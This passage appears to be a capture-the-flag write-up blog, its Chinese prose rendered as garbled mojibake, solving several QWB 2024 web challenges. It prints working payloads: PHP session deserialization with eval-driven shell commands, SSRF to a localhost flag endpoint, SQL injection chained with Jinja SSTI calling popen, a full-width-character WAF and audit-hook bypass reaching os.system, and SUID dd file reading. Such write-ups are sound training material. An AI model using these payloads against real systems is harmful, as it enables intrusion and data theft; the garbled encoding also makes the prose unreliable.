å­—ç¬¦ä¸²é€ƒé€¸æ¥ä¿®æ”¹æˆ‘ä»¬çš„sessionæ–‡ä»¶ï¼Œä»è€Œè¿›è¡Œsessionååºåˆ—åŒ–ã€‚</p><p>æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹å¦‚ä½•ç”Ÿæˆååºåˆ—çš„payload</p><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241122-112048757.png" class="">  <p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶ç›´æ¥è¿›å…¥çš„evalé‚£ä¹ˆä¹…å¾ˆå¥½æ„é€ äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">notouchitsclass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">notouchitsclass</span>(<span class="string">&quot;echo `ls -l /flag`;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">Payloadä¸ºO:<span class="number">15</span>:<span class="string">&quot;notouchitsclass&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;data&quot;</span>;s:<span class="number">19</span>: <span class="string">&quot;echo `ls -l /flag`;&quot;</span>;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241122-112106155.png" class="">  <p> æŸ¥çœ‹sessionç”Ÿæˆé€»è¾‘å¯ä»¥å‘ç°å…¶å…ˆæ˜¯å°†ç”¨æˆ·åå­˜å…¥sessionåéšæœºç”Ÿå­˜1åˆ°50ä¸ªå­—ç¬¦ç»„æˆçš„keyï¼Œå¦‚ä½•å†å°†passwordå­˜å…¥ã€‚å³ç”Ÿæˆçš„sessionå¦‚ä¸‹</p><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241122-112126962.png" class="">  <p>é‚£ä¹ˆå› ä¸ºæˆ‘ä»¬å¯ä»¥æ§åˆ¶usernamå’Œpasswordï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦ä½¿ç”¨systemæ¥è§¦å‘wafï¼Œä»è€Œæ„é€ ä½¿å¾—æˆ‘ä»¬çš„payloadé€ƒé€¸ï¼Œç„¶ååœ¨dashboardè§¦å‘ååºåˆ—åŒ–å³å¯ã€‚å› ä¸ºå…¶ç”Ÿæˆçš„keyå¤§å°æ˜¯éšæœºçš„æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨å¤šä¸ªsystemç„¶åè¿›è¡Œæ¡ä»¶ç«äº‰ã€‚æ¥è§¦å‘ååºåˆ—åŒ–</p><p>Payloadå¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=systemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystem&amp;password=admin&quot;;aaa|O:15:&quot;notouchitsclass&quot;:1 :&#123;s:4:&quot;data&quot;;s:19: &quot;echo `ls -l /flag`;&quot;;&#125;</span><br></pre></td></tr></table></figure><br>è€Œåå†index.phpå‘åŒ…å†dashboard.phpè®¿é—®æ¥è§¦å‘sessionååºåˆ—åŒ–</p><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241122-112144736.png" class="">  <p>è§¦å‘åå‘ç°/flagä¸å¯è¯»ã€‚æ‰§è¡Œ/readflagåå‘ç°ç«Ÿç„¶å¾—åˆ°äº†flag<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=systemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystemsystem&amp;password=admin&quot;;aaa|O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:17:&quot;echo+`/readflag`;&quot;;&#125;</span><br></pre></td></tr></table></figure></p><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241122-112203305.png" class="">  <h1 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h1><p>å…¶å®å°±æ˜¯ä¸ªGoè¯­è¨€å†™çš„ä¸€ä¸ªä»£ç†é€ æˆçš„ssrf<br>è¯´å®è¯éš¾åº¦æ„Ÿè§‰å¾ˆä¸€èˆ¬ï¼Œæ¯”hgameçš„webvpnè¿˜ä½<br>é¦–å…ˆæˆ‘ä»¬å¯ä»¥å‘ç°/v1/api/flagå…¶æ‰§è¡Œäº†readflagæ¥è¿›è¡Œè·å–flag<br>ä½†æ˜¯æˆ‘ä»¬ç›´æ¥è®¿é—®å…¶æ˜¯403ï¼Œå³æˆ‘ä»¬æ²¡æœ‰æƒé™ï¼Œå…¶çŒœæµ‹éœ€è¦åœ¨æœ¬åœ°è®¿é—®ã€‚</p><p>äºæ˜¯æˆ‘ä»¬çœ‹è·¯ç”±ç»„ /v2ï¼Œå¹¶æ·»åŠ äº†ä¸€ä¸ªå¤„ç† POST è¯·æ±‚çš„ /api/proxy è·¯å¾„<br>è¯¥è·¯ç”±ä¼šæ–°å»ºä¸€ä¸ªhttpè¯·æ±‚ï¼Œå…¶è¯·æ±‚æ–¹å¼å’Œbodyéƒ½æ˜¯ç”±å‰é¢çš„ç»“æ„ä½“æ„é€ çš„<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-210811158.png" class="">  </p><p>é‚£ä¹ˆè¿™ä¸å°±å­˜åœ¨SSRFå—ã€‚<br>ä½¿ç”¨å¦‚ä¸‹payloadå°±æ‰“å‡ºæ¥äº†<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">           <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://127.0.0.1:8769/v1/api/flag&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;POST&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;headers&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">               <span class="attr">&quot;User-Agent&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MyCustomAgent&quot;</span></span><br><span class="line">           <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;follow_redirects&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">         <span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h1 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h1><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241122-112326277.png" class="">  <p>è¿›å…¥åå‘ç°å…¶æ˜¯ä¸€ä¸ªæ¸¸æˆï¼Œè¿™æ—¶æ¥çœ‹çœ¼å‰ç«¯ï¼Œå‡ ä¹æ²¡æœ‰ä»£ç ï¼Œäºæ˜¯æˆ‘ä»¬çŒœæµ‹å…¶éœ€è¦æ‰«æç›®å½•ï¼Œä½¿ç”¨å¸¸è§„å­—å…¸å‘ç°æ‰«ä¸åˆ°äºæ˜¯ä½¿ç”¨è„šæœ¬åŠ å…³é”®è¯æ¥ç”Ÿæˆå­—å…¸<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…³é”®å­—åˆ—è¡¨</span></span><br><span class="line">keywords = [</span><br><span class="line">    <span class="string">&quot;snake&quot;</span>,</span><br><span class="line">    <span class="string">&quot;win&quot;</span>,</span><br><span class="line">    <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;success&quot;</span>,</span><br><span class="line">    <span class="string">&quot;victory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;game&quot;</span>,</span><br><span class="line">    <span class="string">&quot;api&quot;</span>,</span><br><span class="line">    <span class="string">&quot;assets&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hidden&quot;</span>,</span><br><span class="line">    <span class="string">&quot;secret&quot;</span>,</span><br><span class="line">    <span class="string">&quot;status&quot;</span>,</span><br><span class="line">    <span class="string">&quot;score&quot;</span>,</span><br><span class="line">    <span class="string">&quot;leaderboard&quot;</span>,</span><br><span class="line">    <span class="string">&quot;history&quot;</span>,</span><br><span class="line">    <span class="string">&quot;result&quot;</span>,</span><br><span class="line">    <span class="string">&quot;backup&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆè·¯å¾„çš„ç»„åˆ</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_paths</span>(<span class="params">keywords</span>):</span><br><span class="line">    paths_dict = <span class="built_in">set</span>()  <span class="comment"># ä½¿ç”¨ set æ¥é¿å…é‡å¤è·¯å¾„</span></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):  <span class="comment"># ç”Ÿæˆ1åˆ°3ä¸ªå…³é”®å­—çš„ç»„åˆ</span></span><br><span class="line">        <span class="keyword">for</span> combination <span class="keyword">in</span> product(keywords, repeat=length):</span><br><span class="line">            <span class="comment"># ä½¿ç”¨ / å’Œ _ æ‹¼æ¥å…³é”®å­—</span></span><br><span class="line">            path_slash = <span class="string">&#x27;/&#x27;</span>.join(combination)  <span class="comment"># ä½¿ç”¨ / è¿æ¥</span></span><br><span class="line">            path_underscore = <span class="string">&#x27;_&#x27;</span>.join(combination)  <span class="comment"># ä½¿ç”¨ _ è¿æ¥</span></span><br><span class="line">            paths_dict.add(path_slash)  <span class="comment"># æ·»åŠ åˆ°é›†åˆä¸­</span></span><br><span class="line">            paths_dict.add(path_underscore)  <span class="comment"># æ·»åŠ åˆ°é›†åˆä¸­</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(paths_dict)  <span class="comment"># è¿”å›æ’åºåçš„è·¯å¾„åˆ—è¡¨</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºç»“æœ</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    paths = generate_paths(keywords)</span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> paths:</span><br><span class="line">        <span class="built_in">print</span>(path)</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>ä½¿ç”¨è¯¥å­—å…¸çˆ†ç ´åå‘ç°ä¸€ä¸ª405çš„è·¯å¾„ã€‚é‚£ä¹ˆè¿™ä¸ªè·¯å¾„åç«¯è‚¯å®šæœ‰é€»è¾‘çš„å˜›</p><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241122-112347741.png" class="">  <p>ä½†ç”¨GETè®¿é—®åå‘ç°ä¸º500ï¼Œå³æˆ‘ä»¬éœ€è¦å¯¹å‚æ•°è¿›è¡Œfuzzã€‚ä¹‹åå‘ç°å‚æ•°ä¸ºusername<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241122-114733709.png" class="">  </p><p>è€Œä¸”å…¶è¿˜å­˜å‚¨äº†æ—¶é—´ï¼Œé‚£ä¹ˆæ—¶é—´è‚¯å®šæ˜¯å­˜åœ¨æ•°æ®åº“é‡Œçš„ï¼Œæˆ‘ä»¬å°è¯•è¿›è¡Œsqlæ³¨å…¥ã€‚ </p><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241122-112438092.png" class="">  <p>å¯ä»¥å‘ç°å…¶æˆåŠŸå›æ˜¾äº†3ï¼Œä½†æ˜¯sqlæ³¨å…¥ä¸çŸ¥é“ä¸ºä»€ä¹ˆè·‘ä¸å‡ºæ¥ï¼Œäºæ˜¯æƒ³åˆ°äº†ï¼Œæ—¢ç„¶æˆ‘ä»¬å¯ä»¥æ“æ§å…¶å›æ˜¾çš„timeï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰å¯èƒ½å­˜åœ¨sstiå‘¢?<br>äºæ˜¯è¿›è¡Œå°è¯•å‘ç°</p><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241122-112500585.png" class="">  <p>å­˜åœ¨ssti<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snake_win?username=<span class="number">1</span><span class="string">&#x27; union select 1,2,&quot;&#123;&#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[&#x27;</span>popen<span class="string">&#x27;](&#x27;</span>cat /flag<span class="string">&#x27;).read()&#125;&#125;&quot;--</span></span><br></pre></td></tr></table></figure></p><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241122-112522519.png" class="">  <h1 id="PyBlockly"><a href="#PyBlockly" class="headerlink" title="PyBlockly"></a>PyBlockly</h1><p>çœ‹çœ¼ä»£ç å¯ä»¥å‘ç°å…¶åŸºç¡€é€»è¾‘å°±æ˜¯è·å–jsonç„¶åå¯¹jsonçš„æ–‡æœ¬è¿›è¡Œä¸€ç³»åˆ—å¤„ç†ï¼Œç„¶åå°†codeå¡å…¥run.pyè¿è¡Œ<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-211834750.png" class=""> </p><p>æˆ‘ä»¬æŸ¥çœ‹å…¶å¯¹textçš„å¤„ç†ï¼Œä¼šå‘ç°å…¶å…ˆæ£€æµ‹äº†è¿è¡Œwafï¼Œç„¶åä½¿ç”¨unidecode.unidecodeçš„è¿›è¡Œè§£ç ï¼Œè¿™å°±å¯¼è‡´äº†ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨unidecodeçš„å­—ç¬¦æ¥è¿›è¡Œç»•è¿‡ï¼Œå³ ()çš„ä¸­æ–‡ï¼ˆï¼‰åœ¨è§£ç åå°±å˜ä¸ºäº†è‹±æ–‡çš„æ‹¬å·ï¼Œå³æˆ‘ä»¬å¯ä»¥å°†è¾“å…¥çš„å†…å®¹è½¬ä¸ºå…¨è§’å­—ç¬¦æ¥ç»•è¿‡waf</p><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-212031632.png" class="">  <p>ä½†ä»ç„¶æ— æ³•å‘½ä»¤æ‰§è¡Œï¼Œè¿™æ˜¯ä»¥ä¸ºå…¶run.pyé‡Œå®šä¹‰äº†ä¸€ä¸ªhookå‡½æ•°ï¼Œå…¶ä¼šé˜»æ­¢æˆ‘ä»¬è§¦å‘é•¿åº¦å¤§äº4äº‹ä»¶å’Œé»‘åå•äº‹ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±åªèƒ½å°è¯•ç»•è¿‡hookã€‚<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-212822358.png" class="">  </p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶å¹¶æ²¡æœ‰è¿‡æ»¤sysemã€‚ä½†æ˜¯systemçš„é•¿åº¦è¶…äº†</p><p>æˆ‘ä»¬å¯ä»¥äº§ç”Ÿä½¿ç”¨ç¯¡æ”¹å†…ç½®å‡½æ•°æ¥è¿›è¡Œç»•è¿‡ã€‚æˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¥å°†å†…ç½®å‡½æ•°lençš„å€¼èµ‹å€¼ä¸º0è¿™æ ·åœ¨è¿è¡Œlen(xxx)æ—¶å°±ä¸º0å³å¯ä»¥ç»•è¿‡é•¿åº¦é™åˆ¶ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;blocks&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;blocks&quot;</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;print&quot;</span>,</span><br><span class="line">        <span class="string">&quot;inputs&quot;</span>: &#123;</span><br><span class="line">          <span class="string">&quot;TEXT&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;block&quot;</span>: &#123;</span><br><span class="line">              <span class="string">&quot;type&quot;</span>: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">              <span class="string">&quot;fields&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;TEXT&quot;</span>: <span class="string">&quot;â€™ï¼‰ï¼›ï½Œï½…ï½ ï¼ ï½Œï½ï½ï½‚ï½„ï½ ï½˜ï¼šï¼ï¼›ï¼¿ï¼¿ï½‰ï½ï½ï½ï½’ï½”ï¼¿ï¼¿ï¼ˆï¼‡ï½ï½“ï¼‡ï¼‰ï¼ï½“ï½™ï½“ï½”ï½…ï½ï¼ˆâ€™â€˜ï¼‰ï¼›ï¼ƒ&quot;</span></span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-213435551.png" class="">  <p>å¯ä»¥å‘ç°å…¶éœ€è¦ææƒ<br>è¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ï½†ï½‰ï½ï½„ã€€ï¼ã€€ï¼ï½•ï½“ï½…ï½’ã€€ï½’ï½ï½ï½”ã€€ï¼ï½ï½…ï½’ï½ã€€ï¼ï¼”ï¼ï¼ï¼ã€€ï¼ï½ï½’ï½‰ï½ï½”ã€€ï¼’ï¼ï¼ï½„ï½…ï½–ï¼ï½ï½•ï½Œï½Œ</span><br></pre></td></tr></table></figure><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-213622447.png" class="">  <p>å¯ä»¥å‘ç°ddå‘½ä»¤æœ‰SUIDæƒé™ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥ä½¿ç”¨ddæ¥è¯»å–æ–‡ä»¶å³å¯<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;blocks&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;blocks&quot;</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;print&quot;</span>,</span><br><span class="line">        <span class="string">&quot;inputs&quot;</span>: &#123;</span><br><span class="line">          <span class="string">&quot;TEXT&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;block&quot;</span>: &#123;</span><br><span class="line">              <span class="string">&quot;type&quot;</span>: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">              <span class="string">&quot;fields&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;TEXT&quot;</span>: <span class="string">&quot;â€™ï¼‰ï¼›ï½Œï½…ï½ ï¼ ï½Œï½ï½ï½‚ï½„ï½ ï½˜ï¼šï¼ï¼›ï¼¿ï¼¿ï½‰ï½ï½ï½ï½’ï½”ï¼¿ï¼¿ï¼ˆï¼‡ï½ï½“ï¼‡ï¼‰ï¼ï½“ï½™ï½“ï½”ï½…ï½ï¼ˆâ€™dd ï½‰ï½†ï¼ï¼flagã€€ï½‚ï½“ï¼ï¼•ï¼‘ï¼’ã€€ï½ƒï½ï½•ï½ï½”ï¼ï¼‘â€˜ï¼‰ï¼›ï¼ƒ&quot;</span></span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-213907926.png" class="">  </p><h1 id="password-Game"><a href="#password-Game" class="headerlink" title="password Game"></a>password Game</h1><p>å‰é¢çš„å°æ¸¸æˆå°±ä¸è¯´äº†<br>ç©é€šæ¸¸æˆåä¼šç»™ä¸€ä¸ªæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;2024qwb&quot;</span>);</span><br><span class="line"><span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&quot;nonono&quot;</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">guest</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username==<span class="string">&quot;guest&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$value</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username==<span class="title function_ invoke__">md5</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">root</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$value</span>=<span class="number">2024</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;value == <span class="string">&quot;2024qwb&quot;</span>)&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;value = <span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;hello:&quot;</span>.<span class="variable">$this</span>-&gt;value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username=<span class="title function_ invoke__">md5</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password-&gt;<span class="title function_ invoke__">guess</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>.<span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span 